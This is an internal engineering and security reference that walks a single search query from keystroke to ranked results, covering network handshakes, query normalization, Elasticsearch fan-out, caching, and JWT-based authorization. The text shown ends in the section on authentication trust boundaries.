# Search Query Processing System: Deep Engineering & Security Breakdown

> **Document Type:** Internal Engineering / Security Reference
> **Classification:** Internal — Engineering & Security Teams
> **Scope:** End-to-end system analysis — keystrokes to ranked results, trust boundaries to attack trees
> **Audience:** Engineers, security reviewers, interview candidates

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios](#9-attack-scenarios)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

### The Story: "User searches for 'distributed tracing best practices'"

This is a concrete, end-to-end trace of a single search query on a SaaS platform (think Elastic, Algolia, or an internal search product). The pipeline must tokenize the query, resolve intent, fan out to multiple indexes, rank results, apply personalization and access control, and return a response — all within 200ms at p99.

---

### Step-by-Step Sequence

**T=0ms — User types in the search box**

The user types `d` into the search input. A debounced JavaScript handler fires. Debounce is typically 150–300ms — the handler does NOT fire on every keystroke, only when the user pauses. This is critical: without debounce, typing "distributed" (11 chars) would fire 11 HTTP requests. With debounce, only the full or partial term after a pause fires.

When the user finally submits (presses Enter or clicks Search), the debounce is bypassed — an immediate request fires.

**T=0ms–5ms — Client-side query handling**

JavaScript reads the input value: `"distributed tracing best practices"`. It performs:
- Trim whitespace
- Enforce max query length (e.g., 500 characters — reject longer at client)
- Encode for URL: `encodeURIComponent("distributed tracing best practices")` → `"distributed%20tracing%20best%20practices"`
- Construct the request: `GET /api/v1/search?q=distributed%20tracing%20best%20practices&page=1&limit=20`
- Attach session token or Bearer token from memory
- Attach `X-Request-ID` UUID generated client-side (for tracing correlation)

No validation of query content happens client-side beyond length. Content validation is not a client-side responsibility.

**T=5ms–60ms — Network transit to Search API**

The browser checks its DNS cache, likely hits (search.example.com was resolved on page load). An existing HTTP/2 connection to the API is reused from the connection pool — no new TCP or TLS handshake. The GET request is serialized into an HTTP/2 DATA frame and sent. Header compression (HPACK) reduces overhead for repeat headers (Authorization, Accept).

**T=60ms — Search API Gateway receives request**

The load balancer (AWS ALB or nginx) routes to the Search API service. The request arrives as a plaintext HTTP/1.1 or HTTP/2 request inside the VPC. The API Gateway middleware stack runs in sequence:

1. Auth middleware: validate JWT, extract user identity and permissions
2. Rate limit middleware: check Redis for this user's request rate
3. Request ID middleware: extract or generate X-Request-ID, attach to context
4. Query parsing middleware: extract and validate query parameters

**T=60ms–75ms — Query parsing and normalization**

The `q` parameter value is extracted from the query string. The raw string is:
`"distributed tracing best practices"`

The query processor performs:

```
Raw input:     "distributed tracing best practices"
After trim:    "distributed tracing best practices"
After lowercase: "distributed tracing best practices"
After tokenization: ["distributed", "tracing", "best", "practices"]
After stopword removal: ["distributed", "tracing", "best", "practices"]
  (none removed — "best" is borderline; depends on domain-specific stopword list)
After stemming (Porter/Snowball):
  "distributed" → "distribut"
  "tracing"     → "trace"
  "best"        → "best"
  "practices"   → "practic"
After synonym expansion:
  "tracing" → also search ["distributed tracing", "observability", "trace"]
  (loaded from synonym dictionary at service startup)
Final query representation:
  must_match: ["distribut", "trace", "practic"]
  should_match: ["observ", "best"]
  boost_phrases: ["distributed tracing"]  ← exact phrase gets higher score
```

**T=75ms — Query planner decides execution strategy**

The query planner inspects the parsed query and decides:
- Which indexes to query (documents, blog posts, API references)
- Whether to use query cache (Redis): `cache:search:{hash(normalized_query)}:{userId_or_anon}`
- Whether to fan out to multiple shards in parallel
- Whether to trigger a "did you mean" spell check (for very short or unusual queries)

Cache check: `GET cache:search:sha256("distribut trace practic best"):usr_abc` → cache miss (first time this exact query was run by this user).

**T=75ms–140ms — Parallel execution**

The query fans out to the search index. In a distributed search system (Elasticsearch/Solr/custom), this means:

1. The coordinator node receives the query
2. It broadcasts the query to all relevant shards (e.g., 5 primary shards)
3. Each shard executes the query locally against its inverted index
4. Each shard returns its top-K results with scores
5. The coordinator merges and re-ranks the top-K across all shards
6. Final top-N (e.g., 20) results are returned to the Search API

This fan-out is parallel — all shards execute simultaneously. Total time = slowest shard, not sum of all shards.

**T=140ms — Post-processing pipeline**

After the raw ranked list returns:

1. **Access control filtering:** Check each result's `allowed_users` or `allowed_groups` field against the user's permissions. Remove results the user can't see. This is done in the application layer, not in the search index, because ACL data is too dynamic to index efficiently for all combinations.

2. **Personalization re-ranking:** A lightweight ML model adjusts scores based on:
   - User's past click history on similar results
   - User's team/role (inferred from JWT claims)
   - Recency signal (newer docs slightly boosted)
   - This is a simple logistic regression or matrix factorization lookup — not a full ML inference call per request

3. **Snippet generation:** For each result, extract the 2–3 sentences most relevant to the query. This uses the stored document text and the query terms — highlights matched terms.

4. **Facet computation:** Counts by category, date, author — used to render sidebar filters.

**T=140ms–160ms — Response construction and cache write**

The final result set is serialized to JSON. Simultaneously, the result is written to Redis cache:
`SET cache:search:{hash}:{userId} {json_result} EX 300`
TTL of 300 seconds — same query by same user in the next 5 minutes hits cache.

**T=160ms — Response delivered to client**

The HTTP response arrives. The browser's JavaScript receives the JSON payload and renders the result list. The user sees results at approximately T=160ms from their keypress.

**Simultaneously (async, not on the critical path):**
- A search event is published to a Kafka topic: `search-events`
- The event contains: userId, query (raw + normalized), result IDs, result count, session context
- This feeds: search analytics, A/B testing evaluation, index quality measurement, personalization model training

**What the user sees vs. what actually happens:**

```
User sees:                            What actually happens:
──────────────────────────────────    ────────────────────────────────────────────────
Search box + results appear at        DNS (cached), HTTP/2 reuse, JWT validation,
~160ms                                query normalize, 5-shard parallel inverted
                                      index query, ACL filter, re-rank, snippet
                                      generation, JSON serialize, cache write

"Showing 847 results" count           847 is the estimated total hit count from the
                                      index coordinator — not an exact count.
                                      Exact counting requires visiting every shard
                                      fully (too slow). Elasticsearch default:
                                      count is exact up to 10,000, estimated above.

Highlighted terms in snippets         Server-side snippet extraction using term
                                      vectors — NOT regex highlighting. Term vectors
                                      map each term to its byte positions in the
                                      stored text, enabling precise highlight ranges.

"Did you mean: distributed tracing"   Spell check runs against a correction index
                                      built from high-frequency queries — Symspell
                                      or Norvig algorithm on the query corpus.
```

---

## 2. Network Layer Flow

### DNS Resolution

```
Browser                  OS Stub Resolver      Recursive Resolver        Auth NS
  │                            │                       │                     │
  │── query: search.example.com│                       │                     │
  │   (check browser cache)    │                       │                     │
  │   cache miss ──────────────▶│                      │                     │
  │                            │── UDP :53 query ─────▶│                     │
  │                            │   "search.example.com"│                     │
  │                            │                       │── query root NS ────▶
  │                            │                       │◀─ .com TLD NS addr ──
  │                            │                       │── query .com TLD ───▶
  │                            │                       │◀─ example.com NS ────
  │                            │                       │── query auth NS ────▶
  │                            │                       │◀─ A: 203.0.113.10 ───
  │◀───────────────────────────│◀──────────────────────│                     │
  │  203.0.113.10, TTL=60      │                       │                     │
```

**DNS-specific mechanics for search systems:**

Search APIs typically sit behind Anycast DNS for global load distribution. The authoritative NS returns a different A record based on:
1. The recursive resolver's IP (GeoDNS) — users in US-East get a different endpoint than EU-West
2. Current health checks — unhealthy endpoints are removed from DNS responses in seconds (TTL-permitting)

**TTL strategy for search:** 60-second TTL is aggressive but correct for a search API. It allows rapid failover. The tradeoff: 60 seconds of stale DNS during a failover event. For zero-downtime DNS failover, you need TTL < 60s in the pre-failover window (gradually lower TTL before planned maintenance), then raise it back after.

**DNS over HTTPS (DoH) behavior:** Chrome and Firefox use DoH by default (Cloudflare 1.1.1.1 or provider-based). This bypasses corporate DNS resolvers — important for enterprises trying to enforce DNS-based filtering. The search API must work with DoH-sourced resolutions, which may have different GeoIP characteristics than traditional DNS paths.

---

### TCP 3-Way Handshake

```
Client (user browser)             Server (LB edge node)
        │                                  │
        │── SYN (seq=ISN_c) ──────────────▶│
        │   Window: 65535 (RWND)           │
        │   MSS option: 1460               │
        │   SACK permitted option          │
        │   Timestamps option              │
        │                                  │
        │◀── SYN-ACK (seq=ISN_s, ack=ISN_c+1) ─│
        │    Window: 28960                 │
        │    MSS: 1460                     │
        │    SACK permitted                │
        │                                  │
        │── ACK (ack=ISN_s+1) ────────────▶│
        │                                  │
        │   [ESTABLISHED — TLS begins]     │
```

**Sequence number mechanics:** ISN (Initial Sequence Number) is pseudo-randomly generated. Modern OS kernels (Linux ≥ 4.x) use a cryptographic PRF seeded with source IP, dest IP, source port, and a secret to generate ISNs. This prevents ISN prediction attacks (blind TCP injection).

**TCP Fast Open (TFO):** In subsequent connections from the same client to the same server, TFO allows data to be sent in the SYN packet itself, using a cookie from a prior successful connection. For a search API where queries are short (GET request fits in one packet), TFO reduces latency by 1 RTT. Not universally supported and has replay risks (see §9).

**SYN flood risk:** The LB must handle SYN floods. SYN cookies allow the server to respond to SYNs without allocating state. The ISN is computed as a hash of the 4-tuple + timestamp. When the ACK arrives, the server verifies the ACK number encodes a valid cookie and only then allocates connection state. AWS ALB has SYN protection built in.

---

### TLS Handshake (TLS 1.3)

```
Client                                         Server
  │                                               │
  │── ClientHello ────────────────────────────────▶
  │   supported_versions: [TLS 1.3, TLS 1.2]      │
  │   cipher_suites:                               │
  │     TLS_AES_128_GCM_SHA256                     │
  │     TLS_AES_256_GCM_SHA384                     │
  │     TLS_CHACHA20_POLY1305_SHA256               │
  │   key_share: X25519 public key (32 bytes)      │
  │   SNI: "search.example.com"                    │
  │   ALPN: ["h2", "http/1.1"]                     │
  │   session_ticket (if resuming)                 │
  │                                                │
  │◀── ServerHello ────────────────────────────────│
  │    chosen: TLS_AES_256_GCM_SHA384              │
  │    key_share: server X25519 public key         │
  │                                                │
  │   [Both sides now compute the shared secret:  │
  │    ECDH(client_private, server_public)         │
  │    = ECDH(server_private, client_public)       │
  │    Derive session keys via HKDF]               │
  │                                                │
  │◀── {Certificate} ──────────────────────────────│ ← encrypted
  │    subject: search.example.com                 │
  │    SANs: search.example.com, *.example.com     │
  │    issuer: DigiCert TLS RSA SHA256 2020 CA1    │
  │    OCSP staple: [signed response from DigiCert]│
  │                                                │
  │◀── {CertificateVerify} ────────────────────────│ ← encrypted
  │    sig: Ed25519(handshake_transcript, priv_key)│
  │                                                │
  │◀── {Finished} ─────────────────────────────────│ ← encrypted
  │    HMAC(handshake_transcript, server_key)      │
  │                                                │
  │── {Finished} ─────────────────────────────────▶│ ← encrypted
  │   HMAC(handshake_transcript, client_key)       │
  │                                                │
  │══ HTTP/2 application data ════════════════════ │ ← fully encrypted
```

**ALPN (Application-Layer Protocol Negotiation):** The client advertises `["h2", "http/1.1"]`. The server picks `h2` (HTTP/2). This negotiation happens inside the TLS handshake, so there's no extra round-trip to upgrade. HTTP/2 is critical for search: it allows multiple concurrent requests (autocomplete, main search, facet loading) over a single TCP connection via multiplexing.

**OCSP Stapling:** The server includes a pre-fetched OCSP response in the handshake. Without stapling, the browser would have to make a separate HTTP request to DigiCert's OCSP responder to check if the cert is revoked — adding 50–200ms of latency on the critical path. With stapling, this is free (included in the handshake bytes).

**Certificate Transparency (CT) logs:** The cert must appear in a public CT log (enforced by Chrome since 2018). If the cert is not in a CT log, Chrome shows a security error. This means any mis-issued cert for `search.example.com` is publicly auditable — an attacker who tricks a CA into issuing a fraudulent cert cannot hide it.

---

### Full Network Flow with Packet-Level Detail

```
USER MACHINE (192.168.1.10)             INTERNET                   DATACENTER
┌────────────────────────────┐                               ┌──────────────────────────────────────┐
│                            │                               │                                      │
│  Chrome Browser            │  ──── TCP + TLS ────────────▶│  AWS ALB / CloudFront                │
│  ─────────────             │       port 443                │  ┌────────────────────┐              │
│  HTTP/2 stack              │◀──── TCP + TLS ───────────────│  │ TLS termination    │              │
│  HPACK compression         │                               │  │ HPACK decompress   │              │
│  Connection pool           │                               │  │ Rate limit         │              │
│                            │                               │  │ WAF (ModSecurity/  │              │
│  DNS cache: search.example │                               │  │  AWS WAF)          │              │
│  → 203.0.113.10 (CDN edge) │                               │  └────────┬───────────┘              │
└────────────────────────────┘                               │           │ HTTP/2 (internal TLS)    │
                                                             │           ▼                          │
                                                             │  ┌─────────────────────┐             │
                                                             │  │  Search API Service  │             │
                                                             │  │  (Go / Java)         │             │
                                                             │  └──────────┬──────────┘             │
                                                             │             │ gRPC (mTLS)             │
                                                             │      ┌──────▼──────┐                 │
                                                             │      │  Elasticsearch│                │
                                                             │      │  Coordinator  │                │
                                                             │      └──────┬────────┘                │
                                                             │     ┌───────┼────────┐                │
                                                             │     ▼       ▼        ▼                │
                                                             │  [Shard0] [Shard1] [Shard2]           │
                                                             │  (primary replicas)                   │
                                                             └──────────────────────────────────────┘

Packet anatomy for a search GET request:
┌────────────┬──────────────┬──────────────────┬──────────────────────────────────────┐
│ IP header  │  TCP header  │  TLS record hdr  │  HTTP/2 DATA frame                  │
│ 20 bytes   │  20 bytes    │  5 bytes         │  HEADERS frame (HPACK compressed)   │
│ dst:203... │  dst:443     │  type: 0x17      │  :method GET                        │
│            │  seq: N      │  ver: 0x0303     │  :path /api/v1/search?q=dist...     │
│            │              │  len: ~200 bytes │  :authority search.example.com      │
│            │              │                  │  authorization: Bearer eyJ...        │
│            │              │                  │  x-request-id: 550e8400-...         │
└────────────┴──────────────┴──────────────────┴──────────────────────────────────────┘
Total packet size: ~300 bytes for the request (GET with compressed headers fits in 1 packet)
Response: ~5-20KB JSON → 4-14 TCP segments

Latency budget:
  DNS (cached):                0ms
  TCP handshake:              50ms  (1 RTT, connection reused = 0ms)
  TLS 1.3 (new conn):         50ms  (1 RTT, resumed = 0ms via session ticket)
  HTTP/2 request send:         1ms  (GET fits in 1 packet)
  API auth + rate limit:      15ms
  Query normalization:         5ms
  Index fan-out (5 shards):   60ms  (parallel, slowest shard wins)
  ACL filter + re-rank:       15ms
  Snippet generation:         10ms
  JSON serialization:          5ms
  Cache write (async):         0ms  (non-blocking, fire and forget)
  Network response:           10ms
  ─────────────────────────────────
  Total (reused connection):  ~120ms
  Total (new connection):     ~220ms
```

**Where failures occur:**

| Location | Failure Type | Symptom | Detection |
|---|---|---|---|
| DNS | TTL expiry during failover | NXDOMAIN or stale IP | DNS health check monitoring |
| TCP | SYN flood | Connection queue full, new SYNs dropped | SYN cookie metrics, connection rate |
| TLS | Expired certificate | Browser security error, 0 requests | Cert expiry monitoring (alert at 30d) |
| TLS | OCSP responder unavailable | Handshake delay (soft-fail) | OCSP response age monitoring |
| HTTP/2 | Stream reset (RST_STREAM) | Request aborted mid-flight | HTTP/2 RST_STREAM rate metric |
| Internal gRPC | Shard unavailable | Partial results (degraded mode) | Shard health metrics, result count drop |
| API Gateway | Rate limit hit | 429 to user | Rate limit trigger rate |

---

## 3. Application Layer Flow

### HTTP Request Structure

```
GET /api/v1/search?q=distributed%20tracing%20best%20practices&page=1&limit=20&filters=type%3Aarticle HTTP/2
Host: search.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI0LTA1In0...
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, br
Cookie: session_id=abc123; _csrf=def456; pref_lang=en
X-Request-ID: 550e8400-e29b-41d4-a716-446655440000
X-Client-Version: web-2.4.1
Cache-Control: no-cache
```

**Header-by-header analysis:**

`Authorization: Bearer <JWT>`: The primary authentication credential. See §5. The JWT is Base64url-encoded and contains no secret itself — it's signed by the auth service's private key. The Search API verifies the signature using the auth service's public key (fetched from JWKS endpoint and cached). If the signature is valid and the token is not expired, the user is authenticated.

`Accept-Encoding: gzip, br`: The client accepts both gzip and Brotli compressed responses. Brotli (br) achieves ~20% better compression than gzip for JSON. The server should prefer Brotli if supported. A 20KB JSON search result compresses to ~3KB with Brotli — significant bandwidth savings at scale (10M searches/day × 17KB savings = 170GB/day bandwidth).

`Cache-Control: no-cache`: Instructs any intermediate cache (CDN, browser cache) that the request must be revalidated against the origin before serving from cache. For a user-specific search (personalized results), this is correct. For anonymous/shared searches, a CDN-level cache with a short TTL (30s) would dramatically reduce origin load.

`X-Client-Version: web-2.4.1`: Client version header. Allows the API to handle version-specific behavior differences. Also critical for debugging — if a new client version is producing malformed queries, you can correlate error rates to this version.

---

### Query String Parameter Parsing

The raw query string: `q=distributed%20tracing%20best%20practices&page=1&limit=20&filters=type%3Aarticle`

After URL decoding:
```
q       = "distributed tracing best practices"
page    = "1"
limit   = "20"
filters = "type:article"
```

**Parsing risks and correct handling:**

`q` parameter:
- Length limit: enforce server-side. If `q` is 100,000 characters, the tokenizer may take seconds. Apply `MAX_QUERY_LENGTH = 500` characters server-side, return 400 if exceeded.
- Character encoding: URL-decode before processing. A query of `%00` URL-decodes to a null byte. The parser must strip or reject null bytes — some systems treat null bytes as string terminators.
- Unicode normalization: apply NFC (canonical decomposition, then canonical composition) to handle cases where the same character can be represented multiple ways in Unicode. Without normalization, "café" as typed on two different keyboard layouts can produce different byte sequences that should map to the same query.

`page` and `limit`:
- Must be parsed as integers — `parseInt("20abc") = 20` in JavaScript (silent truncation). Use strict integer parsing: reject if not a valid integer string.
- Bounds checking: `page >= 1`, `limit >= 1 && limit <= 100`. A `limit=10000` would cause the search engine to fetch and return 10,000 documents — massive memory and serialization cost.
- Deep pagination attack: `page=100000&limit=100` asks for result 10,000,000 through 10,000,100. Most search engines (Elasticsearch) have a `max_result_window` (default 10,000) to prevent this. Deep pagination requires scroll/search-after API, not offset pagination.

`filters` parameter:
- Format: `type:article` — field:value. Multiple filters: `filters=type:article&filters=author:alice` or `filters=type:article,author:alice`.
- CRITICAL: this is user-controlled input that gets translated into a search query. If the filter field and value are directly interpolated into an Elasticsearch query JSON, it's analogous to SQL injection. Use an allowlist of permitted filter fields. Never allow the user to specify arbitrary field names.

---

### Request Routing and Middleware Chain

```
Incoming HTTP request
        │
        ▼
┌────────────────────┐
│  Request Logger    │  Log: method, path, X-Request-ID, client IP, user agent
│  Middleware        │  Attach request context with logger
└────────┬───────────┘
         │
         ▼
┌────────────────────┐
│  Auth Middleware   │  Validate JWT → extract userId, tenantId, scopes
│                    │  On failure: 401 Unauthorized
└────────┬───────────┘
         │
         ▼
┌────────────────────┐
│  Rate Limit        │  Check Redis: requests per minute per userId
│  Middleware        │  Check Redis: requests per minute per IP
│                    │  On limit: 429 Too Many Requests + Retry-After header
└────────┬───────────┘
         │
         ▼
┌────────────────────┐
│  CORS Middleware   │  Validate Origin header against allowlist
│                    │  Return CORS headers if valid origin
└────────┬───────────┘
         │
         ▼
┌────────────────────┐
│  Query Parser      │  Parse + validate all query parameters
│  Middleware        │  Return 400 with error details on invalid params
└────────┬───────────┘
         │
         ▼
┌────────────────────┐
│  Search Handler    │  Business logic — see §4
└────────────────────┘
```

---

### Response Construction

```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Encoding: br
Cache-Control: private, no-store
X-Request-ID: 550e8400-e29b-41d4-a716-446655440000
X-Search-Duration-Ms: 87
X-Results-From-Cache: false
Vary: Accept-Encoding, Authorization

{
  "query": {
    "raw": "distributed tracing best practices",
    "normalized": "distribut trace practic",
    "suggestions": ["distributed tracing", "opentelemetry tracing"]
  },
  "meta": {
    "total": 847,
    "page": 1,
    "limit": 20,
    "durationMs": 87,
    "shards": { "total": 5, "successful": 5, "failed": 0 }
  },
  "results": [
    {
      "id": "doc_a1b2c3",
      "title": "Distributed Tracing Best Practices with OpenTelemetry",
      "url": "/docs/observability/distributed-tracing",
      "snippet": "...learn how <em>distributed tracing</em> helps you understand <em>best practices</em>...",
      "score": 0.94,
      "type": "documentation",
      "author": "Alice Smith",
      "updatedAt": "2024-03-15T00:00:00Z",
      "highlights": {
        "title": ["<em>Distributed Tracing</em> <em>Best Practices</em>"],
        "body": ["...implement <em>distributed tracing</em> across..."]
      }
    }
    // ... 19 more results
  ],
  "facets": {
    "type": [
      { "value": "documentation", "count": 412 },
      { "value": "blog", "count": 235 },
      { "value": "api_reference", "count": 200 }
    ],
    "author": [
      { "value": "Alice Smith", "count": 45 }
    ]
  }
}
```

**Why `Cache-Control: private, no-store` for personalized search results:**
- `private`: The response is specific to this user (personalized). CDN must not cache it for other users.
- `no-store`: The browser should not cache the response to disk. Search results go stale quickly — a cached result from 5 minutes ago may be missing new content.

**For anonymous (non-personalized) searches:** The response can be `Cache-Control: public, max-age=30, s-maxage=30` — cacheable at CDN for 30 seconds. This dramatically reduces origin load for popular queries.

---

## 4. Backend Architecture

### Service Map

```
                    ┌─────────────────────────────────────────────────────────┐
                    │                    API GATEWAY LAYER                     │
                    │  AWS ALB / nginx — TLS termination, HTTP/2, WAF         │
                    └────────────────────────────┬────────────────────────────┘
                                                 │
                    ┌────────────────────────────▼────────────────────────────┐
                    │                   SEARCH API SERVICE                     │
                    │  - JWT validation                                        │
                    │  - Rate limiting (Redis)                                 │
                    │  - Query parsing + normalization                         │
                    │  - Cache lookup (Redis)                                  │
                    │  - Query plan construction                               │
                    │  - Fan-out to search index                               │
                    │  - ACL post-filter                                       │
                    │  - Re-ranking (personalization)                          │
                    │  - Snippet generation                                    │
                    │  - Response serialization                                │
                    │  - Cache write (async)                                   │
                    │  - Event publish (async)                                 │
                    └──────┬───────────────────────┬──────────────────────────┘
                           │ gRPC                  │ async
               ┌───────────▼──────────┐   ┌────────▼──────────┐
               │  Search Index        │   │   Kafka           │
               │  (Elasticsearch /    │   │   search-events   │
               │   OpenSearch)        │   │   topic           │
               │                      │   └────────┬──────────┘
               │  Coordinator node    │            │
               │     │               │   ┌─────────▼──────────┐
               │   ┌─┴─┐ ┌───┐ ┌───┐│   │  Analytics Service │
               │   │S0 │ │S1 │ │S2 ││   │  (ClickHouse /     │
               │   │S3 │ │S4 │     ││   │   Druid)           │
               │   └───┘ └───┘     ││   └────────────────────┘
               └──────────────────────┘
                           │
               ┌───────────▼─────────────────────────────────────────┐
               │              DATA STORES                             │
               │                                                      │
               │  Redis Cluster         PostgreSQL (metadata DB)     │
               │  - Rate limiting       - User preferences           │
               │  - Query cache         - ACL rules                  │
               │  - Session data        - Index document metadata    │
               │  - Suggestion cache    - Audit logs                 │
               │                                                      │
               │  S3 / Object Storage   Feature Store (Redis/Feast)  │
               │  - Raw document store  - User click history vectors │
               │  - Index snapshots     - Personalization features   │
               └──────────────────────────────────────────────────────┘
```

---

### Sync vs. Async Flows

**Synchronous (on the critical path — must complete within request latency budget):**
- JWT validation
- Rate limit check
- Query parsing and normalization
- Cache lookup
- Search index query (fan-out + merge)
- ACL post-filtering
- Snippet generation
- Response serialization

**Asynchronous (off the critical path — failures do not degrade the search result):**
- Search event publish to Kafka (fire-and-forget with circuit breaker)
- Cache write to Redis (non-blocking async write)
- Personalization model input logging (for offline training)
- "Did you mean" spell check for very fast queries (can be appended after initial results)
- Facet count computation for low-priority facets (can be lazy-loaded via a second async request)

**The Kafka search event pipeline:**

```
Search API ──publish──▶ Kafka: search-events
                              │
              ┌───────────────┼──────────────────┐
              ▼               ▼                  ▼
    Analytics Consumer   ML Feature           A/B Test
    (ClickHouse)         Consumer             Consumer
    - Query volume       (Feature store       - Track
    - Zero-result rate     update: user        experiment
    - CTR by position      clicked doc X)      assignments
    - Latency p50/p99      after query Y       - Measure
                                               click rates
```

The Kafka events are the system's "write path" for learning. The search API is the "read path." They evolve independently.

---

### Inverted Index Deep Dive

This is the core data structure of a search system. Understanding it is non-negotiable.

```
Documents:
  doc1: "distributed tracing is a technique for monitoring microservices"
  doc2: "best practices for distributed systems design"
  doc3: "opentelemetry provides distributed tracing capabilities"

Inverted index (simplified):
  Token          →  Postings list (doc_id: term_frequency, positions)
  ────────────────────────────────────────────────────────────────────
  "distribut"    →  [doc1: (tf=1, pos=[0]),
                     doc2: (tf=1, pos=[3]),
                     doc3: (tf=1, pos=[1])]
  "trace"        →  [doc1: (tf=1, pos=[1]),
                     doc3: (tf=1, pos=[2])]
  "practic"      →  [doc2: (tf=1, pos=[1])]
  "microservic"  →  [doc1: (tf=1, pos=[7])]
  "system"       →  [doc2: (tf=1, pos=[4])]
  "opentelemetri"→  [doc3: (tf=1, pos=[0])]

Query: "distribut trace practic"
Steps:
  1. Look up "distribut" → [doc1, doc2, doc3]
  2. Look up "trace"     → [doc1, doc3]
  3. Look up "practic"   → [doc2]
  4. Union: [doc1, doc2, doc3] (for OR semantics)
     Intersection: [] (for strict AND semantics)
     Scoring: BM25 — boosts terms that appear more in this doc
               and less commonly across all docs
  
BM25 score formula:
  score(D, Q) = Σ IDF(qi) × (tf(qi,D) × (k1+1)) / (tf(qi,D) + k1 × (1 - b + b × |D|/avgdl))
  
  IDF(qi) = log((N - n(qi) + 0.5) / (n(qi) + 0.5) + 1)
  
  Where:
  - N = total documents in index
  - n(qi) = number of documents containing term qi
  - tf(qi,D) = term frequency in document D
  - |D| = length of document D (in tokens)
  - avgdl = average document length
  - k1 = 1.2 (term saturation — controls how much repeated terms matter)
  - b = 0.75 (length normalization — penalizes long documents)
```

**Why BM25 over TF-IDF?** BM25 saturates at high term frequencies (controlled by k1). A document with "distributed" appearing 100 times doesn't score 100× higher than one with it appearing once. TF-IDF does not have this saturation, making it manipulable by stuffing terms. BM25 is also length-normalized, so short precise documents can outrank long but diluted ones.

---

### Caching Strategy

**Redis cache for search results:**

Cache key construction:
```
hash = SHA256(normalized_query + "|" + sorted_filters + "|" + page + "|" + limit)
user_specific_key = "cache:search:" + hash + ":" + userId  // personalized
shared_key        = "cache:search:" + hash + ":anon"       // non-personalized
```

Cache invalidation: TTL-based (300 seconds). No explicit invalidation — documents are re-indexed asynchronously. There's a window where cached search results don't reflect recent document updates. This is acceptable for most search use cases. If freshness is critical (e.g., stock prices), cache TTL is reduced to 10–30 seconds or the cache is bypassed entirely for specific query types.

**Suggest/autocomplete cache:**
```
Key: "suggest:{prefix_first_3_chars}:{full_prefix}"
e.g., "suggest:dis:distrib"
Value: JSON array of top-10 suggestions
TTL: 3600s (suggestions change slowly)
```

Prefix suggestions are pre-computed offline from query logs (top queries by frequency) and stored in Redis. The autocomplete endpoint is almost purely a Redis read — microsecond latency, no index query needed.

---

## 5. Authentication & Authorization Flow

### Token Architecture

The search system uses JWTs for authentication with a scope-based authorization model. Critically, search must handle three tiers:

1. **Anonymous users** — no JWT. Rate limited by IP. Can only see public content.
2. **Authenticated users** — JWT with user scopes. See their own content + shared content.
3. **Privileged users** — JWT with admin scopes. Can search across all tenants (in multi-tenant SaaS).

---

### JWT Validation Pipeline

```
Incoming request with: Authorization: Bearer eyJ...

Step 1: Extract token
  token = header["Authorization"].split(" ")[1]
  if not token: return 401 if route requires auth, else continue as anonymous

Step 2: Decode header (no signature check yet — just decode)
  header = base64url_decode(token.split(".")[0])
  = {"alg": "RS256", "typ": "JWT", "kid": "key-2024-05"}

Step 3: Fetch signing key
  key = jwks_cache.get(header.kid)
  if not key:
      key = fetch_from_jwks_endpoint("https://auth.example.com/.well-known/jwks.json")
      jwks_cache.set(header.kid, key, ttl=3600)
  if not key: return 401  // unknown key ID

Step 4: Verify signature
  if not RS256_verify(token, key.public_key): return 401

Step 5: Decode and validate claims
  payload = base64url_decode(token.split(".")[1])
  = {
      "sub": "usr_4a2b1c",
      "iss": "https://auth.example.com",
      "aud": "https://api.example.com",
      "exp": 1716000000,
      "iat": 1715996400,
      "jti": "jwt_unique_abc",
      "scope": ["search:read", "content:read"],
      "tenant": "tenant_99",
      "groups": ["engineering", "platform"]
    }

  Validate:
  - iss == expected issuer:   reject if not "https://auth.example.com"
  - aud includes our service: reject if "https://api.example.com" not in aud
  - exp > now():              reject if expired
  - nbf <= now():             reject if not-before is in the future
  - scope includes required:  for search endpoint, require "search:read"

Step 6: Attach user context to request
  request.ctx.userId = payload.sub
  request.ctx.tenantId = payload.tenant
  request.ctx.groups = payload.groups
  request.ctx.scopes = payload.scope
```

---

### Authorization: Access Control on Search Results

This is the most complex authorization problem in search: **you must filter results based on who is asking, but you don't know which results you'll get until you search.**

**Three approaches (with tradeoffs):**

**Approach 1: Pre-filter (index-time ACL)**
At index time, store the list of user IDs or group IDs who can see each document. At query time, add a `filter` clause: `document.allowed_groups intersects user.groups`. The search index applies this during execution.

```
Query to Elasticsearch:
{
  "query": {
    "bool": {
      "must": { "multi_match": { "query": "distributed tracing" } },
      "filter": {
        "terms": {
          "allowed_groups": ["engineering", "platform", "public"]
          // user's groups + "public"
        }
      }
    }
  }
}
```

**Pros:** ACL enforced in the index — correct result counts, correct facet counts. No post-filtering needed. Fast.
**Cons:** If a user's groups change, all documents must be re-indexed or the ACL data in the index goes stale. Index bloat from ACL fields. Complex to implement for fine-grained per-user permissions.

**Approach 2: Post-filter (application-layer ACL)**
Fetch top-K results from the index (no ACL filter), then filter in the application layer based on the user's permissions.

**Pros:** Index doesn't need ACL data. ACL changes take effect immediately.
**Cons:** Result counts and pagination are wrong. If you fetch 20 results and post-filter removes 15, the user gets 5 results on page 1 but there are actually 20 accessible results in the full result set. Requires over-fetching (fetch 200, return 20 after filtering) — expensive.

**Approach 3: Hybrid (recommended)**
Coarse-grained ACL in the index (public vs. private, tenant isolation) — reduces the candidate set. Fine-grained ACL in the application layer — handles edge cases.

In our example:
- Index filter: `tenantId == user.tenantId` (coarse — only query your tenant's documents)
- App layer filter: check specific document sensitivity level against user's clearance

---

### Trust Boundaries for Auth

```
ZONE 1: Internet
  → JWT presented by user
  → Zero trust: verify everything

ZONE 2: API Gateway
  → JWT signature verified here
  → Claims extracted and forwarded as trusted internal headers
  → Internal services trust X-User-ID header FROM THE GATEWAY only
  → External requests that set X-User-ID directly must be ignored

ZONE 3: Search API Service
  → Receives trusted user context from gateway
  → Makes authorization decisions using context + ACL rules
